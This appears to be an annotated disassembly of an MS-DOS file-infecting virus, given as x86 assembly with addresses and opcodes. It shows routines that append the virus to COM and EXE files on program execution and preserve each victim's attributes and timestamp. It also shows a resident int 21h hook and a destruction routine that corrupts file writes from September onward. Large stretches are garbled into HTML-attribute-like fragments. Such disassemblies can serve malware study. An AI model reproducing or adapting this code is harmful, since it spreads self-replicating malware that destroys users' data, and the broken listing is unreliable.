

seg_a	segment	byte public
	assume	cs:seg_a, ds:seg_a

	org	100h

start:	mov	ax,es						;0100 8C C0
	add	word ptr cs:[d_010C+2],ax ;segment relocation	;0102 2E: 01 06 010E
	jmp	dword ptr cs:[d_010C]	  ;jump into virus code	;0107 2E: FF 2E 010C

d_010C	dw	0000,0138h		;dword=entry into virus	;010C 0000 0138

				;<- duplicated="" code="" (aligning="" to="" 20h="" bytes)="" db="" 0b8h,008h,000h,08eh,0c0h,08bh,00eh,041h="" ;0110="" b8="" 08="" 00="" 8e="" c0="" 8b="" 0e="" 41="" db="" 003h,0bah,028h,000h,02eh,08bh,01eh,09bh="" ;0118="" 03="" ba="" 28="" 00="" 2e="" 8b="" 1e="" 9b="" ;..............................................................="" ;="" victim="" code="" ;..............................................................="" org="" 1380h="" ;="===========================================================================" ;="" segment="" aligned="" virus="" segment="" begin="" ;----------------------------------------------------------------------------="" ;="===============================================================" ;="" com="" virus="" entry="" ;="" (this="" code="" is="" present="" only="" in="" case="" *.com="" infection)="" ;----------------------------------------------------------------="" l_0000:="" push="" ds="" ;1380="" 1e="" push="" cs="" ;1381="" 0e="" pop="" ds="" ;1382="" 1f="" lea="" si,cs:[4f7h]="" ;d_1877="saved" bytes="" ;1383="" 8d="" 36="" 04f7="" mov="" di,100h="" ;1387.bf="" 0100="" mov="" cx,20h="" ;138a="" b9="" 0020="" rep="" movsb="" ;restore="" victim="" bytes="" ;138d="" f3/="" a4="" mov="" byte="" ptr="" cs:[349h],0ffh="" ;d_16c9="" (0ffh="COM)" ;138f="" 2e:="" c6="" 06="" 0349="" ff="" nop="" ;1395="" 90="" pop="" ds="" ;1396="" 1f="" lea="" ax,cs:[54fh]="" ;l_18cf="" ;1397="" 8d="" 06="" 054f="" jmp="" ax="" ;139b="" ff="" e0=""></-><--- duplicated="" fields="" d_033f="" -="" d_0347="" dw="" 0020="" ;139d="" 20="" 00="" dw="" 05eah="" ;139f="" ea="" 05="" dw="" 0bh="" ;13a1="" 0b="" 00="" dw="" 28h="" ;13a3="" 28="" 00="" dw="" 200h="" ;13a5="" 00="" 02="" db="" 0="" ;13a7="" 00="" ;="==========================================================================" ;="" begin="" of="" file="" type="" independent="" virus="" code="" ;---------------------------------------------------------------------------="" ;="===============================================================" ;="" get/set="" victim="" attribute="" ;----------------------------------------------------------------="" s_13a8="" proc="" near="" mov="" dx,offset="" ds:[57fh]="" ;file="" name="" ;13a8.ba="" 057f="" mov="" ah,43h="" ;get/set="" file="" attrb="" ;13ab="" b4="" 43="" int="" 21h="" ;13ad="" cd="" 21="" retn="" ;13af="" c3="" s_13a8="" endp="" ;="===============================================================" ;="" move="" file="" ptr="" to="" eof="" ;----------------------------------------------------------------="" s_13b0="" proc="" near="" xor="" cx,cx="" ;13b0="" 33="" c9="" xor="" dx,dx="" ;13b2="" 33="" d2="" mov="" ax,4202h="" ;move="" file="" ptr="" eof+offset="" ;13b4="" b8="" 4202="" mov="" bx,cs:[9bh]="" ;l_141b="file" handle="" ;13b7="" 2e:="" 8b="" 1e="" 009b="" int="" 21h="" ;13bc="" cd="" 21="" retn="" ;13be="" c3="" s_13b0="" endp="" ;="===============================================================" ;="" read="" 32="" bytes="" into="" buffer="" ;----------------------------------------------------------------="" s_13bf="" proc="" near="" mov="" cx,20h="" ;13bf="" b9="" 0020="" mov="" dx,4f7h="" ;l_1877-sav="" victim="" bytes;13c2.ba="" 04f7="" mov="" bx,cs:[9bh]="" ;l_141b="file" handle="" ;13c5="" 2e:="" 8b="" 1e="" 009b="" mov="" ah,3fh="" ;read="" file="" ;13ca="" b4="" 3f="" int="" 21h="" ;13cc="" cd="" 21="" mov="" cx,ax="" ;bytes="" read="" ;13ce="" 8b="" c8="" retn="" ;13d0="" c3="" s_13bf="" endp="" ;="===============================================================" ;="" write="" 32="" b="" into="" file="" ;----------------------------------------------------------------="" s_13d1="" proc="" near="" mov="" ax,8="" ;switch="" off="" destruction="" ;13d1="" b8="" 0008="" mov="" es,ax="" ;13d4="" 8e="" c0="" mov="" cx,20h="" ;13d6="" b9="" 0020="" mov="" dx,offset="" ds:[4f7h]="" ;l_1877="" -="" saved="" bytes="" ;13d9.ba="" 04f7="" mov="" bx,cs:[9bh]="" ;l_141b="file" handle="" ;13dc="" 2e:="" 8b="" 1e="" 009b="" mov="" ah,40h="" ;write="" file="" cx="bytes" ;13e1="" b4="" 40="" int="" 21h="" ;13e3="" cd="" 21="" mov="" cx,ax="" ;13e5="" 8b="" c8="" retn="" ;13e7="" c3="" s_13d1="" endp="" ;="===============================================================" ;="" calculate="" virus="" length="" ;----------------------------------------------------------------="" s_13e8="" proc="" near="" mov="" ax,612h="" ;virus="" code="" length="" ;13e8="" b8="" 0612="" mov="" dx,28h="" ;file="" type="" depended="" code;13eb="" ba="" 0028="" sub="" ax,dx="" ;13ee="" 2b="" c2="" mov="" ds:[341h],ax="" ;l_16c1="" const="" vcode="" len="" ;13f0="" a3="" 0341="" retn="" ;13f3="" c3="" s_13e8="" endp="" ;="===============================================================" ;="" get/set="" file="" daye="" &="" time="" ;----------------------------------------------------------------="" s_13f4="" proc="" near="" mov="" bx,ds:[9bh]="" ;l_141b="file" handle="" ;13f4="" 8b="" 1e="" 009b="" mov="" ah,57h="" ;get/set="" file="" date="" &="" time="" ;13f8="" b4="" 57="" int="" 21h="" ;13fa="" cd="" 21="" retn="" ;13fc="" c3="" s_13f4="" endp="" ;="===============================================================" ;="" contamine="" file="" -="" master="" routine="" ;----------------------------------------------------------------="" s_13fd="" proc="" near="" mov="" byte="" ptr="" ds:[349h],0="" ;d_16c9="" (000h="EXE)" ;13fd="" c6="" 06="" 0349="" 00="" nop="" ;1402="" 90="" mov="" al,0="" ;1403="" b0="" 00="" call="" s_13a8="" ;get="" victim="" attribute="" ;1405="" e8="" ffa0="" jc="" l_146a="" ;-=""> EXIT		;1408 72 60
	mov	ds:[33Fh],cx		;l_16BF oryg. file attr	;140A 89 0E 033F
	mov	cx,20h						;140E B9 0020
	mov	al,1						;1411 B0 01
	call	s_13A8			;Set victim attribute	;1413 E8 FF92
	jc	l_146A			;-> EXIT		;1416 72 52
	jmp	short l_1421					;1418 EB 07
	nop							;141A 90

d_009B	dw	0005h			;file handle		;141B 05 00
d_009D	dw	0400h						;141D 00 04
d_009F	dw	057Fh			;filepath address	;141F 7F 05

l_1421:	mov	word ptr cs:[9Fh],057Fh	;l_141F	:= offset l_18FF;1421 2E C7 06 9F 00 7F 05
	mov	dx,ds:[9Fh]		;l_141F	- file name	;1428 8B 16 009F
	mov	ax,400h						;142C B8 0400
	mov	ds:[9Dh],ax		;l_141D			;142F A3 009D
	mov	al,2						;1432 B0 02
	mov	ah,3Dh			;open file, al=mode	;1434 B4 3D
	int	21h						;1436 CD 21
	mov	word ptr ds:[9Bh],0FFFFh  ;l_141B = file handle	;1438 C7 06 009B FFFF
	jc	l_1443						;143E 72 03
	mov	ds:[9Bh],ax		;l_141B = file handle	;1440 A3 009B
l_1443:	mov	ax,ds:[9Bh]		;l_141B = file handle	;1443 A1 009B
	cmp	ax,0FFFFh					;1446 3D FFFF
	je	l_146A			;-> EXIT, open file err	;1449 74 1F
	mov	al,0						;144B B0 00
	call	s_13F4			;Get file daye & time	;144D E8 FFA4
	jc	l_148F			;-> err, close & exit	;1450 72 3D
	mov	ds:[0E8h],dx		;l_1468 = date		;1452 89 16 00E8
	mov	ds:[0EDh],cx		;l_146D = time		;1456 89 0E 00ED
	call	s_13BF			;Read 32 B into buffer	;145A E8 FF62
	mov	ax,word ptr ds:[4F7h]	;l_1877 first file word	;145D A1 04F7
	cmp	ax,5A4Dh		;'MZ' ?			;1460 3D 5A4D
	je	l_146F			;-> yes, EXE		;1463 74 0A
	jmp	l_1616			;-> no, COM		;1465 E9 01AE

d_00E8	dw	0EF8h			;victim date		;1468 F8 0E

l_146A:	jmp	l_15C6						;146A E9 0159

d_00ED	dw	0001h			;victim time		;146D 01 00

;================================================================
;	EXE file contamination
;----------------------------------------------------------------
l_146F:	mov	ax,word ptr ds:[509h]	;+12h = negative sum	;146F A1 0509
	neg	ax						;1472 F7 D8
	cmp	ax,word ptr ds:[4F9h]	;+2 = last page bytes	;1474 3B 06 04F9
	je	l_148F			;-> allready infected	;1478 74 15
	mov	ax,word ptr ds:[4FBh]	;+4 = pages in file	;147A A1 04FB
	cmp	ax,3						;147D 3D 0003
	jb	l_148F			;-> file to small	;1480 72 0D
	mov	ax,word ptr ds:[4FFh]	;+8 = size of hdr (para);1482 A1 04FF
	mov	cl,4						;1485 B1 04
	shl	ax,cl						;1487 D3 E0
	mov	ds:[347h],ax		;l_16C7	= size of header;1489 A3 0347
	jmp	short l_1492					;148C EB 04
	nop							;148E 90

l_148F:	jmp	l_15A8						;148F E9 0116

l_1492:	mov	ax,word ptr ds:[50Bh]	;+14h = IP		;1492 A1 050B
	mov	word ptr ds:[5B4h],ax	;l_1934			;1495 A3 05B4
	mov	word ptr ds:[50Bh],28h	;new IP value (l_13A8)	;1498 C7 06 050B 0028
	call	s_13B0			;Move file ptr to EOF	;149E E8 FF0F
	push	ax						;14A1 50
	push	dx						;14A2 52
	sub	ax,ds:[347h]		;l_16C7=size of header	;14A3 2B 06 0347
	sbb	dx,0						;14A7 83 DA 00
	mov	word ptr ds:[439h],ax	;l_17B9			;14AA A3 0439
	mov	word ptr ds:[437h],dx	;l_17B7			;14AD 89 16 0437
	cmp	dx,0						;14B1 83 FA 00
	ja	l_14D3			;-> more then 64KB	;14B4 77 1D
	cmp	ax,word ptr ds:[50Bh]	;+14h = IP		;14B6 3B 06 050B
	ja	l_14D3			;-> more then 28h length;14BA 77 17

					;<- exe="" code="" length=""></->< 28h="" mov="" word="" ptr="" ds:[345h],0="" ;l_16c5="" ;14bc="" c7="" 06="" 0345="" 0000="" mov="" bx,word="" ptr="" ds:[50bh]="" ;14c2="" 8b="" 1e="" 050b="" sub="" bx,ax="" ;28h="" -="" file="" length="" ;14c6="" 2b="" d8="" mov="" ds:[343h],bx="" ;l_16c3="" -="" aligning="" bytes;14c8="" 89="" 1e="" 0343="" mov="" ds:[513h],bx="" ;+1ch="?" ;14cc="" 89="" 1e="" 0513="" jmp="" short="" l_1511="" ;14d0="" eb="" 3f="" nop="" ;14d2="" 90="" l_14d3:="" sub="" ax,word="" ptr="" ds:[50bh]="" ;+14h="IP=28h" ;14d3="" 2b="" 06="" 050b="" sbb="" dx,0="" ;14d7="" 83="" da="" 00="" mov="" ds:[345h],ax="" ;d_16c5="" ;14da="" a3="" 0345="" and="" ax,0fh="" ;14dd="" 25="" 000f="" cmp="" ax,0="" ;14e0="" 3d="" 0000="" jne="" l_14f9="" ;-=""> need aligment	;14E3 75 14

	mov	word ptr ds:[343h],0	;d_16C3	- aligning bytes;14E5 C7 06 0343 0000
	mov	ax,ds:[345h]		;d_16C5			;14EB A1 0345
	mov	cx,10h						;14EE B9 0010
	div	cx						;14F1 F7 F1
	mov	ds:[345h],ax		;d_16C5	- segment of vir;14F3 A3 0345
	jmp	short l_1511					;14F6 EB 19
	db	90h						;14F8 90

				;<---- need="" alignment="" l_14f9:="" mov="" word="" ptr="" ds:[343h],10h="" ;d_16c3="" -="" aligning="" bytes;14f9="" c7="" 06="" 0343="" 0010="" sub="" ds:[343h],ax="" ;d_16c3="" -="" aligning="" bytes;14ff="" 29="" 06="" 0343="" mov="" ax,ds:[345h]="" ;d_16c5="" ;1503="" a1="" 0345="" mov="" cx,10h="" ;1506="" b9="" 0010="" div="" cx="" ;1509="" f7="" f1="" add="" ax,1="" ;+="" alignment="" paragraph="" ;150b="" 05="" 0001="" mov="" ds:[345h],ax="" ;d_16c5="" -="" segment="" of="" vir;150e="" a3="" 0345="" l_1511:="" mov="" ax,word="" ptr="" ds:[50dh]="" ;+="" 16h="CS" ;1511="" a1="" 050d="" mov="" word="" ptr="" ds:[5b6h],ax="" ;d_1936="" -="" victim="" cs="" ;1514="" a3="" 05b6="" mov="" ax,ds:[345h]="" ;d_16c5="" ;1517="" a1="" 0345="" mov="" word="" ptr="" ds:[50dh],ax="" ;+="" 16h="CS" ;151a="" a3="" 050d="" push="" ax="" ;151d="" 50="" mov="" ax,word="" ptr="" ds:[505h]="" ;+="" 0eh="SS" ;151e="" a1="" 0505="" mov="" word="" ptr="" ds:[5a1h],ax="" ;d_1921="" -="" victim="" ss="" ;1521="" a3="" 05a1="" pop="" ax="" ;1524="" 58="" mov="" word="" ptr="" ds:[505h],ax="" ;+="" 0eh="virus" ss="" ;1525="" a3="" 0505="" mov="" ax,word="" ptr="" ds:[507h]="" ;+="" 10h="SP" ;1528="" a1="" 0507="" mov="" word="" ptr="" ds:[5a3h],ax="" ;d_1923="" victim="" sp="" ;152b="" a3="" 05a3="" lea="" ax,cs:[612h]="" ;end="" of="" virus="" ;152e="" 8d="" 06="" 0612="" add="" ax,1eh="" ;virus="" stack="" ;1532="" 05="" 001e="" add="" ax,ds:[343h]="" ;d_16c3="" -="" aligning="" bytes;1535="" 03="" 06="" 0343="" mov="" word="" ptr="" ds:[507h],ax="" ;virus="" sp="" ;1539="" a3="" 0507="" call="" s_13e8="" ;calculate="" virus="" length="" ;153c="" e8="" fea9="" pop="" dx=""></----><- victim="" eof="" ;153f="" 5a="" pop="" ax="" ;1540="" 58="" add="" ax,ds:[341h]="" ;l_16c1="" const="" vcode="" len="" ;1541="" 03="" 06="" 0341="" adc="" dx,0="" ;1545="" 83="" d2="" 00="" add="" ax,ds:[343h]="" ;d_16c3="" -="" aligning="" bytes;1548="" 03="" 06="" 0343="" adc="" dx,0="" ;154c="" 83="" d2="" 00="" mov="" cx,200h="" ;page="" length="" ;154f="" b9="" 0200="" div="" cx="" ;1552="" f7="" f1="" cmp="" dx,0="" ;1554="" 83="" fa="" 00="" je="" l_155a="" ;1557="" 74="" 01="" inc="" ax="" ;1559="" 40="" l_155a:="" mov="" word="" ptr="" ds:[4fbh],ax="" ;+4="" -="" file="" len="" in="" pages="" ;155a="" a3="" 04fb="" mov="" word="" ptr="" ds:[4f9h],dx="" ;+2="" -="" last="" page="" length="" ;155d="" 89="" 16="" 04f9="" neg="" dx="" ;1561="" f7="" da="" mov="" word="" ptr="" ds:[509h],dx="" ;+12h="negative" sum="" ;1563="" 89="" 16="" 0509="" mov="" cx,54fh="" ;offset="" l_18cf-exe="" entry;1567="" b9="" 054f="" mov="" word="" ptr="" ds:[50bh],cx="" ;+14h="" -="" virus="" ip="" ;156a="" 89="" 0e="" 050b="" cmp="" word="" ptr="" ds:[343h],3="" ;d_16c3="" -="" aligning="" bytes;156e="" 83="" 3e="" 0343="" 03="" jb="" l_1580="" ;1573="" 72="" 0b=""></-><- file="" begins="" with="" jump="" mov="" cx,28h="" ;1575="" b9="" 0028="" sub="" cx,ds:[343h]="" ;d_16c3="" -="" aligning="" bytes;1578="" 2b="" 0e="" 0343="" mov="" word="" ptr="" ds:[50bh],cx="" ;157c="" 89="" 0e="" 050b="" l_1580:="" call="" s_15df="" ;set="" file="" pointer="" to="" bof;1580="" e8="" 005c="" call="" s_13d1="" ;write="" 32="" b="" into="" file="" ;1583="" e8="" fe4b="" jc="" l_15a8="" ;-=""> error, EXIT		;1586 72 20
	mov	cx,ds:[343h]		;d_16C3	- aligning bytes;1588 8B 0E 0343
	sub	cx,3			;jmp instruction length	;158C 83 E9 03
	mov	ax,54Fh			;offset l_18CF=EXE entry;158F B8 054F
	mov	bx,28h			;beginning of code	;1592 BB 0028
	sub	ax,bx			;jmp distance		;1595 2B C3
	add	cx,ax			;aligning bytes		;1597 03 C8
	mov	word ptr ds:[54Ch],cx	;l_18CC	= jump distance	;1599 89 0E 054C
	call	s_13B0			;Move file ptr to EOF	;159D E8 FE10
	call	s_15C7			;Align EOF to paragraphs;15A0 E8 0024
	jc	l_15A8			;-> error, EXIT		;15A3 72 03
	call	s_15FE			;Write const part of vir;15A5 E8 0056

;================================================================
;	End of contamination (common to EXE & COM)
;----------------------------------------------------------------
l_15A8:	mov	al,1			;to set			;15A8 B0 01
	mov	dx,ds:ds:[0E8h]		;d_1468	victim date	;15AA 8B 16 00E8
	mov	cx,ds:ds:[0EDh]		;d_146D	victim time	;15AE 8B 0E 00ED
	call	s_13F4			;Set file daye & time	;15B2 E8 FE3F

	mov	bx,ds:[9Bh]		;l_141B = file handle	;15B5 8B 1E 009B
	mov	ah,3Eh			;close file		;15B9 B4 3E
	int	21h						;15BB CD 21

	mov	al,1			;to set			;15BD B0 01
	mov	cx,ds:[33Fh]		;l_16BF oryg. file attr	;15BF 8B 0E 033F
	call	s_13A8			;Set victim attribute	;15C3 E8 FDE2

l_15C6:	retn							;15C6 C3

;================================================================
;	Align end of file to paragraphs
;----------------------------------------------------------------
s_15C7:	mov	ax,8			;to switch off virus	;15C7 B8 0008
	mov	es,ax						;15CA 8E C0
	mov	cx,ds:[343h]		;l_16C3	- aligning bytes;15CC 8B 0E 0343
	mov	dx,54Bh			;offset d_18CB		;15D0.BA 054B
	mov	bx,cs:[9Bh]		;l_141B = file handle	;15D3 2E: 8B 1E 009B
	mov	ah,40h			;write file		;15D8 B4 40
	int	21h						;15DA CD 21
	mov	cx,ax						;15DC 8B C8
	retn							;15DE C3

;================================================================
;	Set file pointer to BOF
;----------------------------------------------------------------
s_15DF:	xor	cx,cx						;15DF 33 C9
	xor	dx,dx						;15E1 33 D2
	mov	ax,4200h	;move file ptr, cx,dx=offset	;15E3 B8 4200
	mov	bx,cs:[9Bh]	;l_141B = file handle		;15E6 2E: 8B 1E 009B
	int	21h						;15EB CD 21
	retn							;15ED C3

;================================================================
;	COM virus start code pattern
;----------------------------------------------------------------
d_026E:	mov	ax,es						;15EE 8C C0
	add	word ptr cs:[010Ch+2],ax			;15F0 2E: 01 06 010E
	jmp	dword ptr cs:[010Ch]				;15F5 2E: FF 2E 010C
d_027A	dw	0						;15FA 00 00
d_027C	dw	0138h						;15FC 38 01

;================================================================
;	Write constant part of virus
;----------------------------------------------------------------
s_15FE:	mov	ax,8			;switch off virus	;15FE B8 0008
	mov	es,ax						;1601 8E C0
	mov	cx,ds:[341h]		;l_16C1	const.code leng.;1603 8B 0E 0341
	mov	dx,28h			;offset l_13A8 - vircode;1607.BA 0028
	mov	bx,cs:[9Bh]		;l_141B = file handle	;160A 2E: 8B 1E 009B
	mov	ah,40h			;write file		;160F B4 40
	int	21h						;1611 CD 21
	mov	cx,ax						;1613 8B C8
	retn							;1615 C3

;================================================================
;	COM victim contamination
;----------------------------------------------------------------
l_1616:	cmp	word ptr ds:[4F9h],12Eh	;BOF+2			;1616 81 3E 04F9 012E
	je	l_15A8			;-> contamined, EXIT	;161C 74 8A
	call	s_13B0			;Move file ptr to EOF	;161E E8 FD8F
	cmp	ax,3E8h			;1000 byte file length	;1621 3D 03E8
	jb	l_169F			;-> bellow, EXIT	;1624 72 79
	add	ax,100h			;add PSP		;1626 05 0100
	adc	dx,0						;1629 83 D2 00
	push	ax						;162C 50
	and	ax,0Fh						;162D 25 000F
	mov	word ptr ds:[343h],0	;l_16C3	aligning bytes	;1630 C7 06 0343 0000
	cmp	ax,0						;1636 3D 0000
	je	l_1645			;-> para aligned file	;1639 74 0A
	mov	word ptr ds:[343h],10h	;l_16C3	- aligning bytes;163B C7 06 0343 0010
	sub	ds:[343h],ax		;l_16C3	- aligning bytes;1641 29 06 0343
l_1645:	pop	ax						;1645 58
	add	ax,ds:[343h]		;l_16C3	aligning bytes	;1646 03 06 0343
	adc	dx,0						;164A 83 D2 00
	cmp	dx,0						;164D 83 FA 00
	ja	l_169F			;-> file to big, EXIT	;1650 77 4D
	mov	cl,4						;1652 B1 04
	shr	ax,cl			;bytes 2 paragraphs	;1654 D3 E8
	cmp	word ptr ds:[343h],0	;l_16C3	- aligning bytes;1656 83 3E 0343 00
	mov	ds:[27Ch],ax		;l_15FC	virus segment	;165B A3 027C
	mov	word ptr ds:[27Ah],0	;l_15FA	virus entry	;165E C7 06 027A 0000
	call	s_15DF			;Set file pointer to BOF;1664 E8 FF78
	mov	ax,8			;to switch off virus	;1667 B8 0008
	mov	es,ax						;166A 8E C0
	mov	cx,20h			;bytes to write		;166C B9 0020
	mov	dx,26Eh			;offset l_15EE		;166F.BA 026E
	mov	bx,cs:[9Bh]		;l_141B = file handle	;1672 2E: 8B 1E 009B
	mov	ah,40h			;write file		;1677 B4 40
	int	21h						;1679 CD 21
	mov	cx,ax			;bytes written		;167B 8B C8
	call	s_13B0			;Move file ptr to EOF	;167D E8 FD30
	call	s_15C7			;write aligning bytes	;1680  E8 FF44

	mov	ax,8			;switch off virus	;1683  B8 0008
	mov	es,ax						;1686  8E C0
	mov	cx,28h			;40 bytes		;1688  B9 0028
	mov	dx,322h			;offset l_16A2		;168B .BA 0322
	mov	bx,cs:[9Bh]		;l_141B = file handle	;168E  2E: 8B 1E 009B
	mov	ah,40h			;write file		;1693  B4 40
	int	21h						;1695  CD 21
	mov	cx,ax			;bytes written		;1697 8B C8
	call	s_13E8			;Calculate virus length	;1699 E8 FD4C
	call	s_15FE			;Write const part of vir;169C  E8 FF5F
l_169F:	jmp	l_15A8			;close files, EXIT	;169F  E9 FF06
s_13FD	endp

				;<-- com="" type="" virus="" begin="" pattern="" d_0322:="" push="" ds="" ;16a2="" 1e="" push="" cs="" ;16a3="" 0e="" pop="" ds="" ;16a4="" 1f="" lea="" si,cs:[4f7h]="" ;16a5="" 8d="" 36="" 04f7="" mov="" di,0100h="" ;16a9.bf="" 0100="" mov="" cx,20h="" ;16ac="" b9="" 0020="" rep="" movsb="" ;16af="" f3/="" a4="" mov="" byte="" ptr="" cs:[349h],0ffh="" ;d_16c9="" (0ffh="COM)" ;16b1="" 2e:="" c6="" 06="" 0349="" ff="" nop="" ;16b7="" 90="" pop="" ds="" ;16b8="" 1f="" lea="" ax,cs:[54fh]="" ;16b9="" 8d="" 06="" 054f="" jmp="" ax="" ;16bd="" ff="" e0="" ;------="" work="" area="" d_033f="" dw="" 0020h="" ;oryg.="" file="" attr="" ;16bf="" 20="" 00="" d_0341="" dw="" 05eah="" ;const="" virus="" code="" length;16c1="" ea="" 05="" d_0343="" dw="" 0bh="" ;aligning="" bytes="" ;16c3="" 0b="" 00="" d_0345="" dw="" 28h="" ;16c5="" 28="" 00="" d_0347="" dw="" 200h="" ;size="" of="" header="" ;16c7="" 00="" 02="" d_0349="" db="" 0="" ;0="EXE," 0ffh="COM" ;16c9="" 00="" ;="===============================================================" ;="" init="" registers="" ;----------------------------------------------------------------="" s_16ca="" proc="" near="" xor="" si,si="" ;16ca="" 33="" f6="" xor="" di,di="" ;16cc="" 33="" ff="" xor="" ax,ax="" ;16ce="" 33="" c0="" xor="" dx,dx="" ;16d0="" 33="" d2="" xor="" bp,bp="" ;16d2="" 33="" ed="" retn="" ;16d4="" c3="" s_16ca="" endp="" ;="===============================================================" ;="" int="" 24h="" handling="" routine="" (infection="" time="" active="" only)="" ;----------------------------------------------------------------="" l_16d5:="" cmp="" di,0="" ;16d5="" 83="" ff="" 00="" jne="" l_16dd="" ;16d8="" 75="" 03="" mov="" al,3="" ;ignore="" ;16da="" b0="" 03="" iret="" ;16dc="" cf="" l_16dd:="" jmp="" dword="" ptr="" cs:[362h]="" ;l_16e2="old" int="" 24h="" ;16dd="" 2e:="" ff="" 2e="" 0362="" d_0362="" dw="" 0556h,0df0h="" ;16e2="" 56="" 05="" f0="" 0d="" ;="===============================================================" ;="" get="" int="" 24h="" ;----------------------------------------------------------------="" s_16e6="" proc="" near="" cli="" ;="" disable="" interrupts="" ;16e6="" fa="" xor="" bx,bx="" ;16e7="" 33="" db="" mov="" es,bx="" ;16e9="" 8e="" c3="" mov="" bx,es:[90h]="" ;int="" 24h="" offset="" ;16eb="" 26:="" 8b="" 1e="" 0090="" mov="" word="" ptr="" cs:[362h],bx="" ;l_16e2="" ;16f0="" 2e:="" 89="" 1e="" 0362="" mov="" bx,es:[92h]="" ;int="" 24h="" segment="" ;16f5="" 26:="" 8b="" 1e="" 0092="" mov="" word="" ptr="" cs:[362h+2],bx="" ;l_16e2+2="" ;16fa="" 2e:="" 89="" 1e="" 0364="" mov="" word="" ptr="" es:[90h],355h="" ;offset="" l_16d5="" ;16ff="" 26:="" c7="" 06="" 0090="" 0355="" mov="" es:[92h],ax="" ;int="" 24h="" segment="" :="CS" ;1706="" 26:="" a3="" 0092="" sti="" ;170a="" fb="" retn="" ;170b="" c3="" s_16e6="" endp="" ;="===============================================================" ;="" restore="" int="" 24h="" vector="" ;----------------------------------------------------------------="" s_170c="" proc="" near="" cli="" ;170c="" fa="" xor="" bx,bx="" ;170d="" 33="" db="" mov="" es,bx="" ;170f="" 8e="" c3="" mov="" bx,word="" ptr="" cs:[362h]="" ;1711="" 2e:="" 8b="" 1e="" 0362="" mov="" es:[90h],bx="" ;1716="" 26:="" 89="" 1e="" 0090="" mov="" bx,word="" ptr="" cs:[362h+2]="" ;171b="" 2e:="" 8b="" 1e="" 0364="" mov="" es:[92h],bx="" ;1720="" 26:="" 89="" 1e="" 0092="" sti="" ;1725="" fb="" retn="" ;1726="" c3="" s_170c="" endp="" ;="==============================================================" ;="" write="" handle="" service="" routine="" (destruction="" routine)="" ;---------------------------------------------------------------="" s_1727="" proc="" near="" push="" ax="" ;1727="" 50="" push="" bx="" ;1728="" 53="" push="" cx="" ;1729="" 51="" push="" dx="" ;172a="" 52="" push="" es="" ;172b="" 06="" push="" ds="" ;172c="" 1e="" push="" si="" ;172d="" 56="" push="" di="" ;172e="" 57="" mov="" ax,es="" ;172f="" 8c="" c0="" cmp="" ax,8="" ;1731="" 3d="" 0008="" je="" l_1750="" ;-=""> virus contamination		;1734 74 1A
	cmp	bx,4						;1736 83 FB 04
	jb	l_1750		;-> BIOS			;1739 72 15
	mov	ah,2Ah		;get date, cx=year, dx=mon/day	;173B B4 2A
	int	21h						;173D CD 21
	cmp	dh,9		;september ?			;173F 80 FE 09
	jb	l_1750		;-> bellow			;1742 72 0C
	pop	di						;1744 5F
	pop	si						;1745 5E
	pop	ds						;1746 1F
	pop	es						;1747 07
	pop	dx						;1748 5A
	pop	cx						;1749 59
	pop	bx						;174A 5B
	pop	ax						;174B 58
	add	dx,0Ah		;shift buffer address		;174C 83 C2 0A
	retn							;174F C3

l_1750:	pop	di						;1750 5F
	pop	si						;1751 5E
	pop	ds						;1752 1F
	pop	es						;1753 07
	pop	dx						;1754 5A
	pop	cx						;1755 59
	pop	bx						;1756 5B
	pop	ax						;1757 58
	retn							;1758 C3
s_1727	endp

	db	16 dup (0)		;not used		;1759 0010[00]

;================================================================
;	Load & Execute service routine
;----------------------------------------------------------------
s_1769	proc	near
	push	ax						;1769 50
	push	bx						;176A 53
	push	cx						;176B 51
	push	dx						;176C 52
	push	es						;176D 06
	push	ds						;176E 1E
	push	si						;176F 56
	push	di						;1770 57
	mov	si,dx			;file pathname		;1771 8B F2
	mov	ax,cs						;1773 8C C8
	mov	es,ax						;1775 8E C0
	mov	di,offset ds:[57Fh]	;l_18FF - victim name	;1777.BF 057F
	mov	cx,19h						;177A B9 0019
	rep	movsb			;copy victim name	;177D F3/ A4
	call	s_16E6			;Get int 24h vector	;177F E8 FF64
	mov	ds,ax			;ds:=cs			;1782 8E D8
	call	s_13FD						;1784 E8 FC76
	call	s_170C			;Restore int 24h vector	;1787 E8 FF82
	pop	di						;178A 5F
	pop	si						;178B 5E
	pop	ds						;178C 1F
	pop	es						;178D 07
	pop	dx						;178E 5A
	pop	cx						;178F 59
	pop	bx						;1790 5B
	pop	ax						;1791 58
	retn							;1792 C3
s_1769	endp

;================================================================
;	New int 21h service routine
;----------------------------------------------------------------
				;<---- 10="" bytes="" to="" identify="" resident="" virus="" d_0413:="" pushf="" ;1793="" 9c="" cmp="" ah,40h="" ;write="" handle="" ;1794="" 80="" fc="" 40="" jne="" l_179f="" ;-=""> no				;1797 75 06
	call	s_1727		;write handle service routine	;1799 E8 FF8B
	jmp	short l_17A7					;179C EB 09
	nop							;179E 90

l_179F:	cmp	ah,4Bh		;Load & Execute ?		;179F 80 FC 4B
	jne	l_17A7		;-> no				;17A2 75 03
	call	s_1769		;Load & Execute service routine	;17A4 E8 FFC2
l_17A7:	popf							;17A7 9D

;================================================================
;   Execute substituted code and jump into old int 21h service
;----------------------------------------------------------------
					;<- four="" bytes="" from="" int="" 21h="" service="" d_0428:="" cmp="" ah,51h="" ;17a8="" 80="" fc="" 51="" d_042b:="" je="" l_17b2="" ;17ab="" 74="" 05="" jmp="" dword="" ptr="" cs:[547h]="" ;17ad="" 2e:="" ff="" 2e="" 0547="" l_17b2:="" jmp="" dword="" ptr="" cs:[49dh]="" ;17b2="" 2e:="" ff="" 2e="" 049d="" d_0437="" dw="" 0000h,02a0h="" ;dword="code" length="" ;17b7="" 00="" 00="" a0="" 02="" ;="===============================================================" ;="" make="" virus="" resident="" ;----------------------------------------------------------------="" s_17bb="" proc="" near="" cli="" ;disable="" interrupts="" ;17bb="" fa="" push="" es="" ;17bc="" 06="" lea="" si,cs:[413h]="" ;l_1793="" ;17bd="" 8d="" 36="" 0413="" mov="" di,si="" ;17c1="" 8b="" fe="" mov="" cx,9800h="" ;resident="" virus="" segment="" ;17c3="" b9="" 9800="" mov="" es,cx="" ;17c6="" 8e="" c1="" mov="" cx,0ah="" ;17c8="" b9="" 000a="" repe="" cmpsb="" ;17cb="" f3/="" a6="" cmp="" cx,0="" ;17cd="" 83="" f9="" 00="" pop="" es="" ;17d0="" 07="" jz="" l_181a="" ;-=""> allready resident	;17D1 74 47
	mov	bx,es:[84h]		;int 21h - offset	;17D3 26: 8B 1E 0084
	mov	ax,es:[86h]		;int 21h - segment	;17D8 26: A1 0086
	mov	word ptr ds:[549h],ax	;l_18C9			;17DC A3 0549
